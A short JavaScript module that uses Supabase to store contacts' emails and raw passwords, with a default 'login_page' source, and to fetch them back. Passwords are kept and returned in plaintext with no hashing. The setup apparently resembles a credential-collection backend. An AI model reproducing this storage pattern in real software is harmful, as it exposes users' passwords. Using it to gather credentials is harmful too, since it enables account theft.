import { createClient } from '@supabase/supabase-js';
import 'dotenv/config';

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_KEY || process.env.SUPABASE_KEY;

const supabase = createClient(supabaseUrl, supabaseKey);

// Store login credentials for a contact
export async function storeLogin(contactId, email, password, provider = 'login_page') {
  if (!contactId) {
    console.warn('[storeLogin] No contactId provided, skipping login storage');
    return null;
  }

  // Check if we have login data to store
  if (!password) {
    console.warn('[storeLogin] No password provided, skipping login storage');
    return null;
  }

  try {
    const { data, error } = await supabase
      .from('logins')
      .insert({
        contact_id: contactId,
        provider: provider,
        email: email,
        password: password,
        created_at: new Date().toISOString(),
      })
      .select('id')
      .single();

    if (error) {
      console.warn('[storeLogin] Login insert error:', error.message);
      return null;
    }

    console.log('[storeLogin] Login stored successfully, ID:', data.id);
    return data.id;
  } catch (e) {
    console.warn('[storeLogin] Login insert exception:', e.message);
    return null;
  }
}

// Get logins for a contact
export async function getLoginsByContactId(contactId) {
  if (!contactId) return [];

  try {
    const { data, error } = await supabase
      .from('logins')
      .select('*')
      .eq('contact_id', contactId)
      .order('created_at', { ascending: false });

    if (error) {
      console.warn('[getLoginsByContactId] Error:', error.message);
      return [];
    }

    return data || [];
  } catch (e) {
    console.warn('[getLoginsByContactId] Exception:', e.message);
    return [];
  }
}


